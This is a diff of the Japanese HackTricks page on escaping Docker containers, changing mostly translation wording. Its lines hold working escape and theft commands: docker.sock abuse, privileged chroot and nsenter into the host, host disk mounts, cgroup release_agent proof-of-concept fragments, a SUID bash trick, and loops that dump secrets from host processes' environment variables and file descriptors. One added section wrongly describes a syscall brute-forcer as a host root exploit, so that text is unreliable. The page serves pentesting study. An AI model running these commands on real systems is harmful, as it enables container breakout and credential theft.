@@ -2,22 +2,22 @@
 
 <details>
 
-<summary><strong>ゼロからヒーローまでAWSハッキングを学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>！</strong></summary>
+<summary><strong>htARTE（HackTricks AWS Red Team Expert）</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>でAWSハッキングをゼロからヒーローまで学ぶ</strong></a><strong>！</strong></summary>
 
 HackTricks をサポートする他の方法:
 
 * **HackTricks で企業を宣伝したい**または **HackTricks をPDFでダウンロードしたい**場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
-* [**公式PEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を入手する
+* [**公式PEASS＆HackTricksスウォッグ**](https://peass.creator-spring.com)を入手する
 * [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションを見つける
-* **💬 [Discordグループ](https://discord.gg/hRep4RUj7f)**または[telegramグループ](https://t.me/peass)に**参加**するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォロー**する
-* **ハッキングテクニックを共有するには、**[**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出してください
+* **💬 [Discordグループ](https://discord.gg/hRep4RUj7f)**に参加するか、[telegramグループ](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)をフォローする
+* **ハッキングトリックを共有するには、** [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出してください。
 
 </details>
 
-<figure><img src="../../../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 \
-[**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks)を使用して、世界で最も高度なコミュニティツールによって強化された**ワークフローを簡単に構築**および**自動化**します。\
+[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)を使用して、世界で最も高度なコミュニティツールによって強化された**ワークフローを簡単に構築**および**自動化**します。\
 今すぐアクセスを取得:
 
 {% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
@@ -26,14 +26,14 @@ HackTricks をサポートする他の方法:
 
 * [**linpeas**](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS): **コンテナを列挙**することもできます
 * [**CDK**](https://github.com/cdk-team/CDK#installationdelivery): このツールは、**現在のコンテナを列挙し、自動的に脱出を試みる**のに非常に便利です
-* [**amicontained**](https://github.com/genuinetools/amicontained): コンテナが持つ権限を取得し、それから脱出する方法を見つけるための便利なツール
+* [**amicontained**](https://github.com/genuinetools/amicontained): コンテナが持つ権限を取得し、そこから脱出する方法を見つけるための便利なツール
 * [**deepce**](https://github.com/stealthcopter/deepce): コンテナからの列挙と脱出のためのツール
 * [**grype**](https://github.com/anchore/grype): イメージにインストールされているソフトウェアに含まれるCVEを取得する
 
 ## マウントされたDockerソケットの脱出
 
-もし何らかの理由で、**dockerソケットがDockerコンテナ内にマウントされている**ことがわかった場合、それから脱出することができます。\
-これは通常、何らかの理由でdockerコンテナがdockerデーモンに接続してアクションを実行する必要がある場合に発生します。
+もしも **dockerソケットがDockerコンテナ内にマウントされている**ことがわかった場合、そこから脱出することができます。\
+これは通常、何らかの理由でDockerコンテナがDockerデーモンに接続してアクションを実行する必要がある場合に発生します。
 ```bash
 #Search the socket
 find / -name docker.sock 2>/dev/null
@@ -54,10 +54,10 @@ nsenter --target 1 --mount --uts --ipc --net --pid -- bash
 docker run -it -v /:/host/ --cap-add=ALL --security-opt apparmor=unconfined --security-opt seccomp=unconfined --security-opt label:disable --pid=host --userns=host --uts=host --cgroupns=host ubuntu chroot /host/ bash
 ```
 {% hint style="info" %}
-**docker** ソケットが予期しない場所にある場合は、**`docker`** コマンドを使用して、パラメータ **`-H unix:///path/to/docker.sock`** を指定してそれと通信することができます。
+**dockerソケットが予期しない場所にある**場合は、**`docker`**コマンドをパラメータ**`-H unix:///path/to/docker.sock`**を使用してそれと通信することができます。
 {% endhint %}
 
-Docker デーモンは、[ポート（デフォルトでは 2375、2376）でリスニング](../../../../network-services-pentesting/2375-pentesting-docker.md)されている可能性があり、Systemd ベースのシステムでは、Docker デーモンとの通信は Systemd ソケット `fd://` を介して行われることがあります。
+Dockerデーモンは、[ポート（デフォルトで2375、2376）でリスニングされる場合もあります](../../../../network-services-pentesting/2375-pentesting-docker.md)し、Systemdベースのシステムでは、Dockerデーモンとの通信はSystemdソケット`fd://`を介して行われることがあります。
 
 {% hint style="info" %}
 さらに、他のハイレベルランタイムのランタイムソケットにも注意してください：
@@ -72,13 +72,13 @@ Docker デーモンは、[ポート（デフォルトでは 2375、2376）でリ
 
 ## Capabilities Abuse Escape
 
-コンテナの機能を確認する必要があります。以下のいずれかの機能がある場合、それから脱出することができるかもしれません: **`CAP_SYS_ADMIN`**、**`CAP_SYS_PTRACE`**、**`CAP_SYS_MODULE`**、**`DAC_READ_SEARCH`**、**`DAC_OVERRIDE, CAP_SYS_RAWIO`**、**`CAP_SYSLOG`**、**`CAP_NET_RAW`**、**`CAP_NET_ADMIN`**
+コンテナの権限をチェックし、以下のいずれかを持っている場合、それから脱出することができるかもしれません: **`CAP_SYS_ADMIN`**_,_ **`CAP_SYS_PTRACE`**, **`CAP_SYS_MODULE`**, **`DAC_READ_SEARCH`**, **`DAC_OVERRIDE, CAP_SYS_RAWIO`, `CAP_SYSLOG`, `CAP_NET_RAW`, `CAP_NET_ADMIN`**
 
-現在のコンテナの機能を確認するには、**前述の自動ツール**または次の方法を使用できます:
+現在のコンテナの権限を確認するには、**前述の自動ツール**または次の方法を使用できます:
 ```bash
 capsh --print
 ```
-以下のページで**Linuxの機能について詳しく学び**、それらを乱用して特権を脱出/昇格する方法を学ぶことができます：
+以下のページで**Linuxの機能について詳しく学び**、それらを悪用して特権を昇格/脱出する方法について学ぶことができます：
 
 {% content-ref url="../../linux-capabilities.md" %}
 [linux-capabilities.md](../../linux-capabilities.md)
@@ -98,7 +98,7 @@ capsh --print
 * `--cgroupns=host`
 * `/dev`をマウント
 
-`--privileged`フラグは、コンテナのセキュリティを著しく低下させ、**制限なしのデバイスアクセス**を提供し、**いくつかの保護をバイパス**します。詳細については、`--privileged`の完全な影響に関するドキュメントを参照してください。
+`--privileged`フラグは、コンテナのセキュリティを著しく低下させ、**制限なしのデバイスアクセス**を提供し、**いくつかの保護をバイパス**します。詳細な説明については、`--privileged`の完全な影響に関するドキュメントを参照してください。
 
 {% content-ref url="../docker-privileged.md" %}
 [docker-privileged.md](../docker-privileged.md)
@@ -106,7 +106,7 @@ capsh --print
 
 ### 特権 + hostPID
 
-これらの権限を持つと、単に`nsenter --target 1 --mount --uts --ipc --net --pid -- bash`を実行するだけで、ホストでrootとして実行されているプロセス（init (pid:1)など）の名前空間に移動できます。
+これらの権限を持つ場合、単に`nsenter --target 1 --mount --uts --ipc --net --pid -- bash`を実行するだけで、ホストでrootとして実行されているプロセス（init (pid:1)など）の名前空間に移動できます。
 
 コンテナでテストを実行します。
 ```bash
@@ -116,13 +116,13 @@ docker run --rm -it --pid=host --privileged ubuntu bash
 
 特権フラグだけで、ホストのディスクにアクセスを試みたり、release\_agentを悪用して脱出を試みることができます。
 
-コンテナで以下のバイパスをテストしてください。
+コンテナで以下のバイパスをテストして実行します：
 ```bash
 docker run --rm -it --privileged ubuntu bash
 ```
 #### ディスクのマウント - Poc1
 
-適切に構成されたDockerコンテナは、**fdisk -l**のようなコマンドを許可しません。ただし、`--privileged`または`--device=/dev/sda1`フラグが指定されたミス構成のDockerコマンドでは、ホストドライブを見る権限を取得することが可能です。
+適切に構成されたDockerコンテナは、**fdisk -l**のようなコマンドを許可しません。ただし、`--privileged`フラグまたは`--device=/dev/sda1`というキャップが指定されたミス構成のDockerコマンドでは、特権を取得してホストドライブを表示することが可能です。
 
 ![](https://bestestredteam.com/content/images/2019/08/image-16.png)
 
@@ -135,7 +135,7 @@ mount /dev/sda1 /mnt/hola
 
 #### ディスクのマウント - Poc2
 
-コンテナ内で、攻撃者はクラスターによって作成された書き込み可能な hostPath ボリュームを介して、基礎となるホスト OS へのさらなるアクセスを試みるかもしれません。以下は、この攻撃ベクトルを利用できるかどうかを確認するためにコンテナ内でチェックできる一般的な項目です。
+コンテナ内では、攻撃者はクラスターによって作成された書き込み可能な hostPath ボリュームを介して、基礎となるホスト OS へのさらなるアクセスを試みるかもしれません。以下は、この攻撃ベクトルを利用できるかどうかを確認するためにコンテナ内でチェックできる一般的な項目です：
 ```bash
 ### Check if You Can Write to a File-system
 echo 1 > /proc/sysrq-trigger
@@ -192,7 +192,11 @@ sh -c "echo 0 > $d/w/cgroup.procs"; sleep 1
 # Reads the output
 cat /o
 ```
-#### 特権昇格 created release\_agent の悪用（[cve-2022-0492](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/)）- PoC2
+{% endcode %}
+
+#### 特権エスケープ created release_agent の悪用 ([cve-2022-0492](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/)) - PoC2
+
+{% code title="Second PoC" %}
 ```bash
 # On the host
 docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash
@@ -242,9 +246,9 @@ cat /output
 [docker-release\_agent-cgroups-escape.md](docker-release\_agent-cgroups-escape.md)
 {% endcontent-ref %}
 
-#### release\_agentを悪用した特権エスケープ - 相対パスが不明な場合の PoC3
+#### release\_agentを悪用した特権エスケープ - 相対パスが不明な場合のPoC3
 
-以前の攻撃では、**ホストのファイルシステム内のコンテナの絶対パスが公開**されていました。ただし、常にそうとは限りません。**ホスト内のコンテナの絶対パスがわからない**場合には、この技術を使用できます：
+以前の攻撃では、**ホストのファイルシステム内のコンテナの絶対パスが公開**されていました。ただし、常にそうとは限りません。**ホスト内のコンテナの絶対パスがわからない場合**には、この技術を使用できます：
 
 {% content-ref url="release_agent-exploit-relative-paths-to-pids.md" %}
 [release\_agent-exploit-relative-paths-to-pids.md](release\_agent-exploit-relative-paths-to-pids.md)
@@ -338,7 +342,7 @@ root        10     2  0 11:25 ?        00:00:00 [ksoftirqd/0]
 ```
 #### 特権エスケープ：機密マウントの悪用
 
-**ホストに関する情報を提供する可能性のあるいくつかのファイルがマウントされている**かもしれません。その中には、**ホストが何かが起こったときに実行するものを示す場合もある**かもしれません（これにより攻撃者がコンテナから脱出することが可能になります）。\
+**ホストに関する情報を提供する可能性のあるいくつかのファイルがマウントされている**かもしれません。そのうちのいくつかは、**ホストが何かが起こったときに実行するものを示すかもしれません**（これにより攻撃者がコンテナから脱出することが可能になります）。\
 これらのファイルの悪用により、次のことが可能になるかもしれません：
 
 - release\_agent（以前にカバー済み）
@@ -355,14 +359,14 @@ root        10     2  0 11:25 ?        00:00:00 [ksoftirqd/0]
 
 ### 任意のマウント
 
-何度かの機会に、**コンテナがホストからのボリュームをマウントしている**ことがあります。このボリュームが正しく構成されていない場合、**機密データにアクセス/変更する可能性があります**：シークレットの読み取り、sshのauthorized\_keysの変更...
+何度かの機会に、**コンテナがホストからのボリュームをマウントしている**ことがあります。このボリュームが正しく構成されていない場合、**アクセス/変更が可能になる機密データ**があるかもしれません：シークレットの読み取り、sshのauthorized\_keysの変更...
 ```bash
 docker run --rm -it -v /:/host ubuntu bash
 ```
 ### 2つのシェルとホストマウントを使用した特権昇格
 
-**コンテナ内のrootとしてのアクセス権**を持ち、ホストからマウントされたフォルダを持つコンテナ内で**特権のないユーザーとしてホストに脱出**し、マウントされたフォルダに対する読み取りアクセス権を持っている場合、\
-**コンテナ内のマウントされたフォルダ**に**bash suidファイル**を作成し、ホストからそれを実行して特権昇格を行うことができます。
+**コンテナ内のrootとしてアクセス**権限があり、ホストからのフォルダがマウントされているコンテナ内で**特権のないユーザーとしてホストに脱出**し、マウントされたフォルダに読み取りアクセス権限がある場合、\
+**コンテナ内のマウントされたフォルダ**に**bash suidファイル**を作成し、**ホストから実行**して特権昇格を行うことができます。
 ```bash
 cp /bin/bash . #From non priv inside mounted folder
 # You need to copy it from the host as the bash binaries might be diferent in the host and in the container
@@ -372,10 +376,10 @@ bash -p #From non priv inside mounted folder
 ```
 ### 2つのシェルを使用した特権昇格
 
-**コンテナ内のrootとしてアクセス**権限を持ち、**特権のないユーザーとしてホストに脱出**した場合、コンテナ内でMKNODの機能（デフォルトで使用可能）を持っている場合、両方のシェルを悪用して**ホスト内で特権昇格**することができます。これは、[**この投稿で説明されています**](https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/)。\
-この機能により、コンテナ内のrootユーザーは**ブロックデバイスファイルを作成**することが許可されます。デバイスファイルは、**基礎となるハードウェアやカーネルモジュールにアクセス**するために使用される特別なファイルです。たとえば、/dev/sdaブロックデバイスファイルは、**システムディスク上の生データを読み取る**ためのアクセスを提供します。
+**コンテナ内でrootアクセス**があり、**特権のないユーザーとしてホストに脱出**した場合、コンテナ内でMKNODの機能を持っていれば（デフォルトで持っています）、両方のシェルを悪用して**ホスト内で特権昇格**することができます。これは、[**この投稿で説明されています**](https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/)。\
+このような機能を持つと、コンテナ内のrootユーザーは**ブロックデバイスファイルを作成**することが許可されます。デバイスファイルは、**基礎となるハードウェアやカーネルモジュールにアクセス**するために使用される特別なファイルです。たとえば、/dev/sdaブロックデバイスファイルは、**システムディスク上の生データを読む**ためのアクセスを提供します。
 
-Dockerは、コンテナ内でのブロックデバイスの誤用に対して、**ブロックデバイスの読み書き操作をブロック**するcgroupポリシーを強制します。ただし、コンテナ内で**ブロックデバイスが作成**されると、**/proc/PID/root/**ディレクトリを介してコンテナ外からアクセスできるようになります。このアクセスには、コンテナ内外の**プロセス所有者が同じである必要**があります。
+Dockerは、コンテナ内でのブロックデバイスの誤用に対して、**ブロックデバイスの読み書き操作をブロック**するcgroupポリシーを強制します。ただし、コンテナ内で**ブロックデバイスが作成**されると、**/proc/PID/root/**ディレクトリを介してコンテナの外部からアクセスできるようになります。このアクセスには、コンテナ内外で**プロセス所有者が同じ**である必要があります。
 
 この[**解説**](https://radboudinstituteof.pwning.nl/posts/htbunictfquals2021/goodgames/)からの**悪用**例：
 ```bash
@@ -419,9 +423,9 @@ HTB{7h4T_w45_Tr1cKy_1_D4r3_54y}
 ```
 docker run --rm -it --pid=host ubuntu bash
 ```
-例えば、`ps auxn`のようなコマンドを使用してプロセスをリストアップし、コマンド内の機密情報を検索することができます。
+たとえば、`ps auxn`のようなコマンドを使用してプロセスをリストアップし、コマンド内の機密情報を検索することができます。
 
-その後、**/proc/ホスト内の各プロセスにアクセスできるため、単にその環境変数の秘密情報を盗むことができます**。
+その後、**/proc/ホスト内の各プロセスにアクセスできるため、単にその環境変数の秘密を盗むことができます**。次のように実行します：
 ```bash
 for e in `ls /proc/*/environ`; do echo; echo $e; xargs -0 -L1 -a $e; done
 /proc/988058/environ
@@ -430,7 +434,7 @@ HOSTNAME=argocd-server-69678b4f65-6mmql
 USER=abrgocd
 ...
 ```
-あなたは他のプロセスのファイルディスクリプタにアクセスし、それらのオープンされたファイルを読むこともできます。
+あなたはまた、**他のプロセスのファイルディスクリプタにアクセスして、それらのオープンされたファイルを読む**ことができます。
 ```bash
 for fd in `find /proc/*/fd`; do ls -al $fd/* 2>/dev/null | grep \>; done > fds.txt
 less fds.txt
@@ -440,39 +444,39 @@ lrwx------ 1 root root 64 Jun 15 02:25 /proc/635813/fd/4 -> /.secret.txt.swp
 # You can open the secret filw with:
 cat /proc/635813/fd/4
 ```
-あなたはまた**プロセスを終了させ、DoSを引き起こす**ことができます。
+あなたは**プロセスを終了させ、DoSを引き起こす**こともできます。
 
 {% hint style="warning" %}
-もしコンテナの外側のプロセスに特権アクセスを持っている場合は、`nsenter --target <pid> --all`や`nsenter --target <pid> --mount --net --pid --cgroup`のようなコマンドを実行して、そのプロセスと同じns制限（たぶんなし）を持つシェルを実行することができます。
+もし何らかの方法で**コンテナ外のプロセスに特権アクセス**を持っている場合、`nsenter --target <pid> --all`や`nsenter --target <pid> --mount --net --pid --cgroup`のようなコマンドを実行して、そのプロセスと同じns制限（たぶんなし）を持つシェルを**実行**できます。
 {% endhint %}
 
 ### hostNetwork
 ```
 docker run --rm -it --network=host ubuntu bash
 ```
-もしコンテナがDockerの[ホストネットワーキングドライバ(`--network=host`)](https://docs.docker.com/network/host/)で構成されている場合、そのコンテナのネットワークスタックはDockerホストから分離されていません（コンテナはホストのネットワーキング名前空間を共有しており、コンテナには独自のIPアドレスが割り当てられません）。言い換えると、**コンテナはすべてのサービスを直接ホストのIPにバインド**します。さらに、コンテナは共有インターフェースでホストが送受信している**すべてのネットワークトラフィックを傍受**できます (`tcpdump -i eth0`)。
+もしコンテナがDockerの[ホストネットワーキングドライバ(`--network=host`)](https://docs.docker.com/network/host/)で構成されている場合、そのコンテナのネットワークスタックはDockerホストから分離されておらず（コンテナはホストのネットワーキング名前空間を共有しています）、コンテナには独自のIPアドレスが割り当てられません。言い換えると、**コンテナはすべてのサービスを直接ホストのIPにバインド**します。さらに、コンテナは共有インターフェースでホストが送受信している**すべてのネットワークトラフィックを傍受**できます (`tcpdump -i eth0`)
 
 例えば、これを使用してホストとメタデータインスタンス間のトラフィックを**スニッフィングやスプーフィング**することができます。
 
 以下の例のように：
 
-- [解説: Google SREに連絡する方法: Cloud SQLにシェルをドロップする](https://offensi.com/2020/08/18/how-to-contact-google-sre-dropping-a-shell-in-cloud-sql/)
-- [メタデータサービスのMITMによるルート特権昇格（EKS / GKE）](https://blog.champtar.fr/Metadata\_MITM\_root\_EKS\_GKE/)
+* [Writeup: Google SREに連絡する方法: クラウドSQLにシェルをドロップする](https://offensi.com/2020/08/18/how-to-contact-google-sre-dropping-a-shell-in-cloud-sql/)
+* [メタデータサービスのMITMによるルート権限昇格（EKS / GKE）](https://blog.champtar.fr/Metadata\_MITM\_root\_EKS\_GKE/)
 
-また、ホスト内で**localhostにバインドされたネットワークサービスにアクセス**したり、ノードの**メタデータ権限にアクセス**したりすることもできます（これはコンテナがアクセスできる権限と異なる場合があります）。
+また、ホスト内で**localhostにバインドされたネットワークサービスにアクセス**したり、ノードの**メタデータ権限にアクセス**したりすることもできます（これはコンテナがアクセスできるものと異なる場合があります）。
 
 ### hostIPC
 ```bash
 docker run --rm -it --ipc=host ubuntu bash
 ```
-`hostIPC=true`を使用すると、ホストのプロセス間通信（IPC）リソースにアクセスできます。たとえば、`/dev/shm`内の**共有メモリ**にアクセスできます。これにより、他のホストやポッドプロセスが同じIPCリソースを使用している場所に読み書きできます。これらのIPCメカニズムをさらに調査するには、`ipcs`を使用します。
+`hostIPC=true`を使用すると、ホストのプロセス間通信（IPC）リソースにアクセスできます。たとえば、`/dev/shm`内の**共有メモリ**にアクセスできます。これにより、他のホストやポッドプロセスが使用する同じIPCリソースで読み取り/書き込みが可能になります。これらのIPCメカニズムをさらに調査するには、`ipcs`を使用します。
 
 * **/dev/shmの調査** - この共有メモリの場所にあるファイルを調べます：`ls -la /dev/shm`
 * **既存のIPC施設の調査** - `/usr/bin/ipcs`を使用して、使用されているIPC施設があるかどうかを確認できます。次のコマンドを使用して確認します：`ipcs -a`
 
-### 機能の回復
+### 権限の回復
 
-シスコール**`unshare`**が禁止されていない場合、次のコマンドを実行してすべての機能を回復できます：
+シスコール**`unshare`**が禁止されていない場合、次のコマンドを実行してすべての権限を回復できます：
 ```bash
 unshare -UrmCpf bash
 # Check them with
@@ -480,20 +484,20 @@ cat /proc/self/status | grep CapEff
 ```
 ### シンボリックリンクを使用したユーザー名前空間の悪用
 
-[https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/](https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/) で説明されている2番目のテクニックは、ユーザー名前空間でバインドマウントを悪用して、ホスト内のファイルに影響を与える方法を示しています（特定のケースでは、ファイルを削除します）。
+[https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/](https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/) で説明されている2番目のテクニックは、ユーザー名前空間でバインドマウントを悪用して、ホスト内のファイル（特定の場合はファイルの削除）に影響を与える方法を示しています。
 
-<figure><img src="../../../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) を使用して、世界で最も先進的なコミュニティツールによって強化された**ワークフローを簡単に構築**および**自動化**します。\
-今すぐアクセスを取得：
+今すぐアクセスを取得:
 
 {% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
 
-## CVEs
+## CVE
 
 ### Runc exploit (CVE-2019-5736)
 
-`docker exec` を root として実行できる場合（おそらく sudo で）、CVE-2019-5736 を悪用してコンテナから脱出して特権を昇格させることができます（[こちら](https://github.com/Frichetten/CVE-2019-5736-PoC/blob/master/main.go)に exploit があります）。このテクニックは、基本的に**ホスト内の** _**/bin/sh**_ **バイナリをコンテナから上書き**するものであり、docker exec を実行すると誰でもペイロードをトリガーできます。
+`docker exec` を root として実行できる場合（おそらく sudo で）、CVE-2019-5736 を悪用してコンテナから脱出して特権を昇格させることができます（[こちら](https://github.com/Frichetten/CVE-2019-5736-PoC/blob/master/main.go)に exploit があります）。このテクニックは基本的に、**ホスト内の** _**/bin/sh**_ バイナリを**コンテナから上書き**するものであり、docker exec を実行すると誰でもペイロードをトリガーできます。
 
 ペイロードを適切に変更し、`go build main.go` で main.go をビルドします。生成されたバイナリは、実行のために docker コンテナに配置する必要があります。\
 実行時に `[+] Overwritten /bin/sh successfully` と表示されると、ホストマシンから次のコマンドを実行する必要があります：
@@ -502,7 +506,7 @@ cat /proc/self/status | grep CapEff
 
 これにより、main.go ファイルに存在するペイロードがトリガーされます。
 
-詳細については: [https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html](https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html)
+詳細については、[https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html](https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html) を参照してください。
 
 {% hint style="info" %}
 コンテナが脆弱である可能性のある他の CVE があります。リストは[こちら](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/cve-list)で見つけることができます。
@@ -512,8 +516,8 @@ cat /proc/self/status | grep CapEff
 
 ### Docker 脱出サーフェス
 
-* **名前空間:** プロセスは名前空間によって**他のプロセスから完全に分離**されている必要があります。そのため、名前空間によって他のプロセスとのやり取りを脱出することはできません（デフォルトでは IPC、Unix ソケット、ネットワークサービス、D-Bus、他のプロセスの `/proc` を介して通信できません）。
-* **ルートユーザー:** プロセスを実行するデフォルトのユーザーはルートユーザーです（ただし、権限は制限されています）。
+* **名前空間:** プロセスは名前空間によって**他のプロセスと完全に分離**される必要があります。そのため、名前空間によって他のプロセスとのやり取りから脱出することはできません（デフォルトでは IPC、Unix ソケット、ネットワークサービス、D-Bus、他のプロセスの `/proc` を介して通信できません）。
+* **ルートユーザー:** プロセスを実行するデフォルトのユーザーはルートユーザーです（ただし、その権限は制限されています）。
 * **機能:** Docker は次の機能を残します：`cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap=ep`
 * **Syscall:** これらは**ルートユーザーが呼び出せないシスコール**です（機能の不足 + Seccomp のため）。他のシスコールを使用して脱出を試みることができます。
 
@@ -561,7 +565,37 @@ cat /proc/self/status | grep CapEff
 ```
 {% endtab %}
 
-{% tab title="syscall_bf.c" %}以下は、Dockerコンテナ内で特権昇格を行うためのシンプルな方法です。この手法は、Dockerコンテナ内で実行されているプロセスがホストマシン上のカーネルシステムコールを直接呼び出すことに基づいています。これにより、特権昇格が可能となります。この手法を使用すると、Dockerコンテナ内のプロセスがホストマシン上でroot権限を取得できる可能性があります。{% endtab %}
+{% tab title="syscall_bf.c" %}
+
+## Docker Breakout Privilege Escalation
+
+### Description
+
+This exploit demonstrates a privilege escalation vulnerability in Docker that allows an attacker to break out of a Docker container and gain root access on the host system.
+
+### Usage
+
+Compile the `syscall_bf.c` code on the host system using the provided Makefile:
+
+```bash
+make
+```
+
+Run the compiled binary to execute the exploit:
+
+```bash
+./syscall_bf
+```
+
+### Impact
+
+Successful exploitation of this vulnerability can lead to a complete compromise of the host system, allowing an attacker to access sensitive data, modify system configurations, and perform malicious activities with elevated privileges.
+
+### Recommendation
+
+To mitigate this vulnerability, ensure that Docker is up to date with the latest security patches and follow best practices for securing Docker containers, such as running containers with the least privileges necessary and monitoring container activities for suspicious behavior.
+
+{% endtab %}
 ````c
 // From a conversation I had with @arget131
 // Fir bfing syscalss in x64
@@ -625,7 +659,7 @@ If you are in **userspace** (**no kernel exploit** involved) the way to find new
 * [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/exposed-docker-socket](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/exposed-docker-socket)
 * [https://bishopfox.com/blog/kubernetes-pod-privilege-escalation#Pod4](https://bishopfox.com/blog/kubernetes-pod-privilege-escalation#Pod4)
 
-<figure><img src="../../../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Use [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
 Get Access Today:
@@ -641,7 +675,7 @@ Other ways to support HackTricks:
 * If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
 * Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
 * Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
+* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
 * **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
